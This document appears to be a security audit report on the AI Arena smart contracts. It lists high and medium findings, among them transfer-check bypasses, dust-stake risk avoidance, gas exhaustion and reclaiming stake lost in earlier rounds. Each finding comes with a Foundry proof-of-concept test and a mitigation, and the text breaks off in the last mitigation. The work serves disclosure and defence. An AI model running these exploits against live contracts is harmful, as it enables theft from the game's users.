# [H-1] - User can bypass FighterFarm::safeTransferFrom checks to transfer staked NFT to another address and play game infinitely

## Lines of code
[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L338-L365](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L338-L365)

## Vulnerability details

`FighterFarm::transferFrom` and `FighterFarm::safeTransferFrom` functions are created to override OpenZeppelin's ERC721 transfer functions to provide additional vital checks before transferring a NFT token.

```javascript
    function transferFrom(
        address from, 
        address to, 
        uint256 tokenId
    ) 
        public 
        override(ERC721, IERC721)
    {
@>      require(_ableToTransfer(tokenId, to));
        _transfer(from, to, tokenId);
    }
```
```javascript
    function safeTransferFrom(
        address from, 
        address to, 
        uint256 tokenId
    ) 
        public 
        override(ERC721, IERC721)
    {
@>      require(_ableToTransfer(tokenId, to));
        _safeTransfer(from, to, tokenId, "");
    }
```

`FighterFarm::_ableToTransfer` function checks if the receiving address already has the maximum amount of fighter NFTs. It also checks if the NFT token is already staked by an address.

```javascript
function _ableToTransfer(uint256 tokenId, address to) private view returns(bool) {
        return (
          _isApprovedOrOwner(msg.sender, tokenId) &&
          balanceOf(to) < MAX_FIGHTERS_ALLOWED &&
          !fighterStaked[tokenId]
        );
    }
```

This check prevents users from creating multiple addresses, stake their NFT, play the game, use all their energy/voltage and then transfer it to another address and play again with full energy/voltage. There is also another check in place in `RankedBattle::stakeNRN` and `unstakeNRN` functions to prevent this scenario. When a user unstakes an NFT, it locks it for the round so it can be staked by another user in the same round.

```javascript
function unstakeNRN(uint256 amount, uint256 tokenId) external {
        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
        .
        . some code
        .       
@>      hasUnstaked[tokenId][roundId] = true;
        .
        . some code
        .
    }

function stakeNRN(uint256 amount, uint256 tokenId) external {
        require(amount > 0, "Amount cannot be 0");
        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
        require(_neuronInstance.balanceOf(msg.sender) >= amount, "Stake amount exceeds balance");
@>      require(hasUnstaked[tokenId][roundId] == false, "Cannot add stake after unstaking this round");
        .
        . some code
        .
    }
```

A malicious user can bypass all these checks by transferring his staked NFT to another address using a version of OpenZeppelin's `ERC721::safeTransferFrom` function which is public and not overriden:

```javascript
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    ) public virtual override {
        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner nor approved");
        _safeTransfer(from, to, tokenId, data);
    }
```

In this function there is also `bytes memory data` as function input. `FighterFarm.sol` doesn't account for this public function. A user can transfer his NFT token to another address without going through the mandatory checks, by just calling this function with random `data`.

## Impact

A user can create multiple addresses and play the game infinitely with just 1 NFT token. The user can bypass all the checks that are in place that try to prevent this exact scenario. This way the user can stack points across multiple addresses and potentially claim a HUGE portion of NRN tokens at the end of the round.

## Proof of Concept

Consider the following scenario:

1. User has 1 NFT token.
2. User stakes the NFT so he can earn points while playing the game.
3. User plays all 10 games of the day and doesn't want to spend money to buy a battery to recharge his voltage to keep playing.
4. User simply transfers his NFT using this exploit to another address that he owns.
5. User stakes the NFT again from the second address.
6. User plays another 10 games gaining points.
7. User can repeat this infinitely.

Proof of Code (paste the code below in `RankedBattle.t.sol` test file):

```javascript
    function testPlayerWithOneFighterCanPlayInfinitely() public {
        
        // Create 2 addresses that the attacker controls
        address attacker = vm.addr(3);
        address attacker2 = vm.addr(4);

        // Use helper function to mint attacker 1 NFT
        _mintFromMergingPool(attacker);
        uint8 attackerTokenId = 0;

        // Use helper function to mint attacker 4k NRN tokens to be able to stake
        _fundUserWith4kNeuronByTreasury(attacker);

        // Attacker stakes 2 NRN tokens and his NFT
        vm.prank(attacker);
        _rankedBattleContract.stakeNRN(2 * 10 ** 18, attackerTokenId);
        assertEq(_rankedBattleContract.amountStaked(attackerTokenId), 2 * 10 ** 18);

        // Attacker plays 10 games which is the limit
        vm.startPrank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        vm.stopPrank();

        uint256 wins;
        (wins ,,) = _rankedBattleContract.fighterBattleRecord(attackerTokenId);
        assertEq(wins, 10);

        // Attacker tries to transfer his NFT using the function with the vital checks
        // Transaction reverts
        vm.prank(attacker);
        vm.expectRevert();
        _fighterFarmContract.safeTransferFrom(attacker, attacker2, attackerTokenId);

        // Attacker successfully transfers his NFT using the function which is not overriden
        // Passing any random data as input 
        vm.prank(attacker);
        _fighterFarmContract.safeTransferFrom(attacker, attacker2, attackerTokenId, "hello");

        // Attacker transfers some NRN tokens to his second address so he can stake
        vm.prank(attacker);
        _neuronContract.transfer(attacker2, 2 * 10 ** 18);

        // Attacker uses his second address to stake the same NFT
        vm.prank(attacker2);
        _rankedBattleContract.stakeNRN(2 * 10 ** 18, attackerTokenId);
        assertEq(_rankedBattleContract.amountStaked(attackerTokenId), 4 * 10 ** 18);

        // Attacker plays 10 more games from his second address
        vm.startPrank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
        vm.stopPrank();

        // We assume every game he has played is a win so we can easily count
        // How many games he has played from both addresses
        (wins ,,) = _rankedBattleContract.fighterBattleRecord(attackerTokenId);
        assertEq(wins, 20);

        // Attacker can repeat this infinitely

        // Here we show that attacker can also safely unstake after he is done with all his addresses
        // Without errors
        vm.prank(attacker2);
        _rankedBattleContract.unstakeNRN(2 * 10 ** 18, attackerTokenId);

        vm.prank(attacker2);
        _fighterFarmContract.safeTransferFrom(attacker2, attacker, attackerTokenId, "hello");

        vm.prank(attacker);
        _rankedBattleContract.unstakeNRN(2 * 10 ** 18, attackerTokenId);
    }
```

## Tools Used

Foundry, manual review

## Recommended Mitigation Steps

Consider also overriding this function in `FighterFarm.sol` by pasting the following code:

```javascript
    function safeTransferFrom(
        address from, 
        address to, 
        uint256 tokenId,
        bytes memory data
    ) 
        public 
        override(ERC721, IERC721)
    {
        require(_ableToTransfer(tokenId, to));
        _safeTransfer(from, to, tokenId, "");
    }
```

After implementing the above function in `FighterFarm.sol`, the test used in Proof of Code reverts.

# [H-2] - User can bypass GameItems::safeTransferFrom and transfer non-transferable game items, potentially gaining unfair advantages

## Lines of code

[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L291](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L291)

## Vulnerability details

The `GameItems.sol` contract inherits from OZ's ERC1155. `GameItems::safeTransferFrom` function aims to override OZ's ERC1155 `safeTransferFrom` function to implement an addition check if the item is transferable:

```javascript
    struct GameItemAttributes {
        string name;
        bool finiteSupply;
@>      bool transferable;
        uint256 itemsRemaining;
        uint256 itemPrice;
@>      uint256 dailyAllowance;
    }

    function safeTransferFrom(
        address from, 
        address to, 
        uint256 tokenId,
        uint256 amount,
        bytes memory data
    ) 
        public 
        override(ERC1155)
    {
 @>     require(allGameItemAttributes[tokenId].transferable);
        super.safeTransferFrom(from, to, tokenId, amount, data);
    }
```

OZ's ERC1155 contract also has another transfer function called `safeBatchTransferFrom` which is not overridden in the `GameItems` contract.

```javascript
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] memory ids,
        uint256[] memory amounts,
        bytes memory data
    ) public virtual override {
        require(
            from == _msgSender() || isApprovedForAll(from, _msgSender()),
            "ERC1155: caller is not token owner nor approved"
        );
        _safeBatchTransferFrom(from, to, ids, amounts, data);
    }
```

Using this function call a user can transfer a game item which should not be transferable. This also allows the user mint more items than his `dailyAllownce`, since he can also mint from other addresses and transfer to his main address.

## Impact

A user can transfer game items which are set as non-transferable. This could potentially give him a huge advantage over his opponents. He can also exceed his `dailyAllowance` by creating multiple addresses, minting game items and transferring them.

## Proof of Concept

Proof of code (paste the following code in your `GameItems.t.sol` test file):

```javascript
    function testTransferNonTransferableGameItems() public {
        address attacker = vm.addr(3);
        _fundUserWith4kNeuronByTreasury(attacker);
        _fundUserWith4kNeuronByTreasury(_DELEGATED_ADDRESS);

        // Set game item's transferability to false
        _gameItemsContract.adjustTransferability(0, false);

        // Attacker mints his daily allowance of 10 game items
        vm.startPrank(attacker);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);
        _gameItemsContract.mint(0, 1);

        // Confirm attacker can't mint 11th game item and exceed his allowance
        vm.expectRevert();
        _gameItemsContract.mint(0, 1);
        vm.stopPrank();

        // Confirm attacker can't transfer his game items by calling the safeTransferFrom function
        // Which checks for transferability
        vm.prank(attacker);
        vm.expectRevert();
        _gameItemsContract.safeTransferFrom(attacker, _DELEGATED_ADDRESS, 0, 10, "");
        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 0);
        assertEq(_gameItemsContract.balanceOf(attacker, 0), 10);

        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = 0;
        amounts[0] = 10;

        // Confirm attacker can transfer his non-transferable game items by calling safeBatchTransferFrom
        vm.prank(attacker);
        _gameItemsContract.safeBatchTransferFrom(attacker, _DELEGATED_ADDRESS, ids, amounts, "");
        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 10);
        assertEq(_gameItemsContract.balanceOf(attacker, 0), 0);
    }
```

## Tools Used

Foundry, Manual review

## Recommended Mitigation Steps

Consider also overriding the `safeBatchTransferFrom` in the `GameItems.sol` contract and not allowing its usage since it can complicate things a lot if a user tries to transfer transferable and non-transferable items in the same transaction:

```diff
+    function safeBatchTransferFrom(
+        address from, 
+        address to, 
+        uint256[] memory ids,
+        uint256[] memory amounts,
+        bytes memory data
+    ) 
+        public 
+        override(ERC1155)
+    {
+        revert();
+    }
```

# [H-3] - User can stake small amount of NRN and play the game without the risk of ever losing NRN tokens, only winning

## Lines of code

[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439)
[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L245](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L245)

## Impact

`RankedBattle::stakeNRN` function has no minimum deposit limit as long as deposit `amount > 0`. This means a user can deposit as little as 1 wei.

```javascript
    function stakeNRN(uint256 amount, uint256 tokenId) external {
@>      require(amount > 0, "Amount cannot be 0");
        .
        .
        .
    }
```

The `RankedBattle::_addResultPoints` function calculates and distributes points after a battle.

- If a user has staked any amount of tokens and wins a fight, his fighter NFT gains points which are later used to claim NRN tokens after the round is completed.
- If a user has staked any amount of tokens and loses a fight, his fighter NFT should lose points. In this case, if his fighter NFT doesn't have any points from previously winning battles, a portion of the user's staked NRN tokens should be transferred to the `StakeAtRisk.sol` contract and the user gets the risk of losing them.

This is not the case if a user has staked a small certain amount of points:

```javascript
    function _addResultPoints(
        uint8 battleResult, 
        uint256 tokenId, 
        uint256 eloFactor, 
        uint256 mergingPortion,
        address fighterOwner
    ) 
        private 
    {
        uint256 stakeAtRisk;
        uint256 curStakeAtRisk;
        uint256 points = 0;

        /// Check how many NRNs the fighter has at risk
        stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);

        /// Calculate the staking factor if it has not already been calculated for this round 
        if (_calculatedStakingFactor[tokenId][roundId] == false) {
            stakingFactor[tokenId] = _getStakingFactor(tokenId, stakeAtRisk);
            _calculatedStakingFactor[tokenId][roundId] = true;
        }

        /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
@>        curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
        if (battleResult == 0) {
            /// If the user won the match

            /// If the user has no NRNs at risk, then they can earn points
@>          if (stakeAtRisk == 0) {
@>              points = stakingFactor[tokenId] * eloFactor;
            }

            /// Divert a portion of the points to the merging pool
            uint256 mergingPoints = (points * mergingPortion) / 100;
            points -= mergingPoints;
            _mergingPoolInstance.addPoints(tokenId, mergingPoints);

            /// Do not allow users to reclaim more NRNs than they have at risk
            if (curStakeAtRisk > stakeAtRisk) {
                curStakeAtRisk = stakeAtRisk;
            }

            /// If the user has stake-at-risk for their fighter, reclaim a portion
            /// Reclaiming stake-at-risk puts the NRN back into their staking pool
            if (curStakeAtRisk > 0) {
                _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);
                amountStaked[tokenId] += curStakeAtRisk;
            }

            /// Add points to the fighter for this round
            accumulatedPointsPerFighter[tokenId][roundId] += points;
            accumulatedPointsPerAddress[fighterOwner][roundId] += points;
            totalAccumulatedPoints[roundId] += points;
            if (points > 0) {
                emit PointsChanged(tokenId, points, true);
            }
        } else if (battleResult == 2) {
            /// If the user lost the match

            /// Do not allow users to lose more NRNs than they have in their staking pool
            if (curStakeAtRisk > amountStaked[tokenId]) {
                curStakeAtRisk = amountStaked[tokenId];
            }
            if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {
                /// If the fighter has a positive point balance for this round, deduct points 
                points = stakingFactor[tokenId] * eloFactor;
                if (points > accumulatedPointsPerFighter[tokenId][roundId]) {
                    points = accumulatedPointsPerFighter[tokenId][roundId];
                }
                accumulatedPointsPerFighter[tokenId][roundId] -= points;
                accumulatedPointsPerAddress[fighterOwner][roundId] -= points;
                totalAccumulatedPoints[roundId] -= points;
                if (points > 0) {
                    emit PointsChanged(tokenId, points, false);
                }
            } else {
                /// If the fighter does not have any points for this round, NRNs become at risk of being lost
@>              bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);
                if (success) {
                    _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);
                    amountStaked[tokenId] -= curStakeAtRisk;
                }
            }
        }
    }
```

`curStakeAtRisk` is calculating how many NRN tokens are at risk. `curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;` is calculated in a way that can be manipulated. `bpsLostPerLoss` is initially set to 10 (`uint256 public bpsLostPerLoss = 10;`).
If a user has only staked 1 wei, then `curStakeAtRisk = (10 * ( 1 + 0 )) / 10**4` which is equal to 0. A user can deposit a maximum of `9 * 10**2` to exploit this.
This means the user can never get `stakeAtRisk` since his `curStakeAtRisk` will always be equal to 0.
We can also see that if the user wins the match, his fighter NFT will gain points. So we now always get the 3 following scenarios:

1. Win -> User's fighter NFT gains points.
2. Lose + positive point balance -> Deduct from the point balance
3. Lose + no points -> Nothing happens (should move some of their NRN staked to the Stake At Risk contract)

## cProof of Concept

Consider the following scenario:

1. User deposits and stakes the amount of 9 * 10**2 NRN
2. User can play the game as intended when a user has staked balance
3. User wins matches and gains points, allowing him to claim NRN when the round ends
4. User cannon lose any NRN balance even if he loses every match he plays (should NOT be the case)

Proof of code:

Paste the following code in the `RankedBattle.t.sol` test file.

```javascript
    function testUserCantGetStakeAtRisk() public {

        // We create 2 addresses to compare them
        address attacker = vm.addr(3);
        address player = vm.addr(4);

        // We mint 1 NFT to the attacker, 1 to the player
        _mintFromMergingPool(attacker);
        _mintFromMergingPool(player);
        uint8 attackerTokenId = 0;
        uint8 playerTokenId = 1;

        // Use helper function to mint 4k NRN to each address
        _fundUserWith4kNeuronByTreasury(attacker);
        _fundUserWith4kNeuronByTreasury(player);

        // Deposit small amount with attacker and normal amount with player
        vm.prank(attacker);
        _rankedBattleContract.stakeNRN(9 * 10 ** 2, attackerTokenId);
        assertEq(_rankedBattleContract.amountStaked(attackerTokenId), 9 * 10 ** 2);
        vm.prank(player);
        _rankedBattleContract.stakeNRN(3_000 * 10 ** 18, playerTokenId);
        assertEq(_rankedBattleContract.amountStaked(playerTokenId), 3_000 * 10 ** 18);


        // Make both attacker and player lose their 1st battle
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 2, 1500, true);
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(playerTokenId, 0, 2, 1500, true);
        

        // Verify both got a loss
        uint256 losses;
        (,, losses) = _rankedBattleContract.fighterBattleRecord(attackerTokenId);
        assertEq(losses, 1);
        (,, losses) = _rankedBattleContract.fighterBattleRecord(playerTokenId);
        assertEq(losses, 1);

        // Verify attacker got no stake at risk, while player got
        assert(_stakeAtRiskContract.getStakeAtRisk(0) == 0);
        assert(_stakeAtRiskContract.getStakeAtRisk(1) > 0);
        
        console.log(_stakeAtRiskContract.getStakeAtRisk(0));
        console.log(_stakeAtRiskContract.getStakeAtRisk(1));
    }
```
Console logs:
0
3000000000000000000

## Tools Used

Foundry, manual review

## Recommended Mitigation Steps

Consider adding a minimum deposit amount of `1 * 10 ** 3` or more. Also if you implement a minimum deposit amount you should also modify the `unstakeNRN` function to not leave dust amounts when someone is unstaking.

```diff
    function stakeNRN(uint256 amount, uint256 tokenId) external {
---     require(amount > 0, "Amount cannot be 0");
+++     require(amount >= 1 * 10 ** 3, "Amount too low");
```

```diff
    function unstakeNRN(uint256 amount, uint256 tokenId) external {
        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
+++     if (amountStaked[tokenId] - amount < 1 * 10 ** 3) {
+++         amount = amountStaked[tokenId];
+++     }
```

# [M-1] - Claiming NFT rewards gas cost can get very expensive or even get higher than Ethereum's block gas limit

## Lines of code

[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139-L167](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139-L167)

## Impact

`MergingPool::claimRewards` function has a nested "for" loop. The first loop is only bounded by time. This means the loop gets bigger as time passes without the user claiming his pending rewards.

```javascript
    function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes
    ) 
        external 
    {
        uint256 winnersLength;
        uint32 claimIndex = 0;
@>      uint32 lowerBound = numRoundsClaimed[msg.sender];
@>      for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
            numRoundsClaimed[msg.sender] += 1;
            winnersLength = winnerAddresses[currentRound].length;
            for (uint32 j = 0; j < winnersLength; j++) {
                if (msg.sender == winnerAddresses[currentRound][j]) {
                    _fighterFarmInstance.mintFromMergingPool(
                        msg.sender,
                        modelURIs[claimIndex],
                        modelTypes[claimIndex],
                        customAttributes[claimIndex]
                    );
                    claimIndex += 1;
                }
            }
        }
        if (claimIndex > 0) {
            emit Claimed(msg.sender, claimIndex);
        }
    }
```

If the user has never claimed rewards, `lowerBound` will be 0. It then loops until it reaches `roundId`. Each round could last 1 week (as mentioned in their docs) or 2 weeks (as the devs mentioned in discord channel) or another unspecified timeframe.

Not only that, but there is also another for loop running for the total winners amount of each round which is currently set to 2 (`uint256 public winnersPerPeriod = 2;`) but could also be changed by the admins:

```javascript
    function updateWinnersPerPeriod(uint256 newWinnersPerPeriodAmount) external {
        require(isAdmin[msg.sender]);
        winnersPerPeriod = newWinnersPerPeriodAmount;
    }
```

The gas cost of this function can get very high the longer a user hasn't claimed pending rewards.

## Proof of Concept

Add the following function in `MergingPool.t.sol` test file which claims results for only 2 periods/rounds (it's the `testClaimRewardsForWinnersOfMultipleRoundIds()` function slightly changed to conserve some gas where not needed to spend):

```javascript
    uint256 private checkpointGasLeft = 1;
    uint256 checkpointGasLeft2 = 1;

    function testClaimRewardsForWinnersOfMultipleRoundIdsGasUsage() public {
        vm.txGasPrice(40);
        checkpointGasLeft = gasleft();
        console.log(gasleft());

        _mintFromMergingPool(_ownerAddress);
        _mintFromMergingPool(_DELEGATED_ADDRESS);
        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;

        // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);

        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);

        // winners of roundId 1 are picked
        _mergingPoolContract.pickWinner(_winners);

        // winner claims rewards for previous roundIds
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        checkpointGasLeft2 = gasleft();
        uint256 gasDelta = checkpointGasLeft - checkpointGasLeft2;
        console.log("Gas used: ", gasDelta);
    }
```
`console.log` results: Gas used: 1_847_730

Forge results:
Running 1 test for test/MergingPool.t.sol:MergingPoolTest
[PASS] testClaimRewardsForWinnersOfMultipleRoundIdsGasUsage() (gas: 1_856_771)

The actual gas usage of the function is not that high but we get a decent estimation. It is clear that over long period of unclaimed rewards, e.g. 1 year or 50+ weeks/rounds the user may not even be able to claim anymore.

## Tools Used

Foundry, manual review

## Recommended Mitigation Steps

1. Consider adding the functionality for an admin to be able to claim the rewards for the users at the end of each round. This won't be very gas expensive since its round has 2 winners at the moment.
2. Consider completely changing the logic behind claiming rewards (not recommended, could also break other stuff).

# [M-2] - Player can recover stake at risk funds that he lost on previous rounds

## Lines of code

[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/StakeAtRisk.sol#L104](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/StakeAtRisk.sol#L104)

## Vulnerability details

The problem begins from the fact that a user can `RankedBattle::unstakeNRN` from a NFT fighter with `stakeAtRisk` for that `tokenId`. After unstaking that NFT he can transfer/sell it to another user, who can start playing with that NFT without staking, because the `tokenId` has a `stakingFactor` because it still has `stakeAtRisk` at the current round from the previous owner:

```javascript
    function _getStakingFactor(uint256 tokenId, uint256 stakeAtRisk) private view returns (uint256) {
        uint256 stakingFactor_ = FixedPointMathLib.sqrt((amountStaked[tokenId] + stakeAtRisk) / 10 ** 18);
        if (stakingFactor_ == 0) {
            stakingFactor_ = 1;
        }
        return stakingFactor_;
    }
```

`StakeAtRisk::amoutLost` storage mapping keeps track of the total NRN tokens that an address has lost. The `StakeAtRisk::reclaimNRN` function gets called when a user has won a battle AND his NFT fighter has `stakeAtRisk`. Through this function, a user reclaims some of his NRN tokens that are at risk:


```javascript
    /// @notice Mapping of address to the amount of NRNs that have been swept.
    mapping(address => uint256) public amountLost;

    /// @notice Reclaims NRN tokens from the stake at risk.
    /// @dev This function can only be called by the RankedBattle contract to reclaim 
    /// NRN tokens from the stake at risk.
    /// @dev This gets triggered when they win a match while having NRNs at risk.
    /// @param nrnToReclaim The amount of NRN tokens to reclaim.
    /// @param fighterId The ID of the fighter.
    /// @param fighterOwner The owner of the fighter.
    function reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {
        require(msg.sender == _rankedBattleAddress, "Call must be from RankedBattle contract");
        require(
            stakeAtRisk[roundId][fighterId] >= nrnToReclaim, 
            "Fighter does not have enough stake at risk"
        );

        bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);
        if (success) {
            stakeAtRisk[roundId][fighterId] -= nrnToReclaim;
            totalStakeAtRisk[roundId] -= nrnToReclaim;
            amountLost[fighterOwner] -= nrnToReclaim;
            emit ReclaimedStake(fighterId, nrnToReclaim);
        }
    }
```

But there is no check that a user/address has `stakeAtRisk` at the current `roundId`. That means that a user who has lost NRN tokens at previous rounds, has some value in the `StakeAtRisk::amoutLost` mapping. If this user gets a NFT fighter which also has some `stakeAtRisk` at the current `roundId`, he can win back some of the NRN tokens he lost at previous rounds.

## Impact

A user can buy/get transferred a NFT fighter with `stakeAtRisk` at the current `roundId`. He can use that NFT to play because it has `stakingFactor`. If the user loses the fight, he loses nothing because the user has no `amountStaked` for that `tokenId`. If he wins the fight, he wins back NRN he had lost from previous rounds.

## Proof of Concept

Consider the following scenario:

1. Bob loses NRN at the first round of the game.
2. Rounds ends, second round begins.
3. Alice joins the game, plays some fights and loses.
4. Alice doesn't like the game, decides to unstake everything and sell her NFT fighter which has `stakeAtRisk`.
5. Bob buys that NFT.
6. Bob can play the game without staking with Alice's NFT because it still has `stakingFactor` from Alice.
7. If bob loses, he loses nothing since he has no `amountStaked` with that `tokenId`. If bob wins, he reclaims NRN tokens he lost in the previous/first round
8. Bob can call `RankedBattle::unstakeNRN` with that `token` and get back this NRN at his wallet.

Proof of Code (paste the following test function at `RankedBattle.t.sol` test file):

```javascript
    function testUserCanReclaimNrnLostAtPreviousRounds() public {
        // Create 2 different address, mint them NFT fighters and NRN balance
        address alice = vm.addr(3);
        address bob = vm.addr(4);
        _mintFromMergingPool(alice);
        uint256 aliceTokenId = 0;
        _mintFromMergingPool(bob);
        uint256 bobTokenId = 1;

        _fundUserWith4kNeuronByTreasury(alice);
        _fundUserWith4kNeuronByTreasury(bob);

        // Both addresses stake some NRN so they can play with rewards
        vm.prank(bob);
        _rankedBattleContract.stakeNRN(3_000 * 10 ** 18, bobTokenId);
        assertEq(_rankedBattleContract.amountStaked(bobTokenId), 3_000 * 10 ** 18);

        vm.prank(alice);
        _rankedBattleContract.stakeNRN(3_000 * 10 ** 18, aliceTokenId);
        assertEq(_rankedBattleContract.amountStaked(aliceTokenId), 3_000 * 10 ** 18);

        // Bob loses his first game and gets some balance put at risk and now has less amount staked
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(bobTokenId, 0, 2, 1500, false);
        uint256 bobStakeAtRisk = _stakeAtRiskContract.getStakeAtRisk(bobTokenId);
        assert(bobStakeAtRisk > 0);
        assert(_rankedBattleContract.amountStaked(bobTokenId) < 3_000 * 10 ** 18);

        // Alice wins a game, because to move to a new round there must be a win in the round
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(aliceTokenId, 0, 0, 1500, true);

        // Advance to a new round
        _rankedBattleContract.setNewRound();

        // New round so none of the fighters have stake at risk
        uint256 aliceStakeAtRisk = _stakeAtRiskContract.getStakeAtRisk(aliceTokenId);
        bobStakeAtRisk = _stakeAtRiskContract.getStakeAtRisk(bobTokenId);
        assertEq(bobStakeAtRisk, 0);
        assertEq(aliceStakeAtRisk, 0);

        // Alice's NFT fighter loses a round putting some stake at risk
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(aliceTokenId, 0, 2, 1500, true);
        aliceStakeAtRisk = _stakeAtRiskContract.getStakeAtRisk(aliceTokenId);
        assert(aliceStakeAtRisk > 0);

        // Alice unstakes all her balance and transfers/sells her fighter to Bob
        vm.prank(alice);
        _rankedBattleContract.unstakeNRN(3_000 * 10 ** 18, aliceTokenId);

        vm.prank(alice);
        _fighterFarmContract.safeTransferFrom(alice, bob, 0);

        // Bob has the new NFT with 0 amount staked
        assertEq(_rankedBattleContract.amountStaked(aliceTokenId), 0);

        // Bob plays a game and wins
        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(aliceTokenId, 0, 0, 1500, true);

        // Bob claims back the stake at risk he lost at the previous round
        assert(_rankedBattleContract.amountStaked(aliceTokenId) > 0);

        // Bob's balance before unstaking AND the amount of NRN the NFT reclaimed
        uint256 balanceBefore = _neuronContract.balanceOf(bob);
        uint256 balanceOfNft = _rankedBattleContract.amountStaked(aliceTokenId);

        // Bob unstakes
        vm.prank(bob);
        _rankedBattleContract.unstakeNRN(3_000 * 10 ** 18, aliceTokenId);

        // Balance after = balance before unstaking + balance of NFT
        uint256 balanceAfter = _neuronContract.balanceOf(bob);
        assertEq(balanceBefore + balanceOfNft, balanceAfter);
    }
```

## Tools Used

Foundry, manual review

## Recommended Mitigation Steps

There are 2 easy ways to avoid this situation:

1. Add a check at `RankedBattle::updateBattleRecord` function that a user can't fight if his NFT fighter has unstaked this round

```diff
    function updateBattleRecord(
        uint256 tokenId,
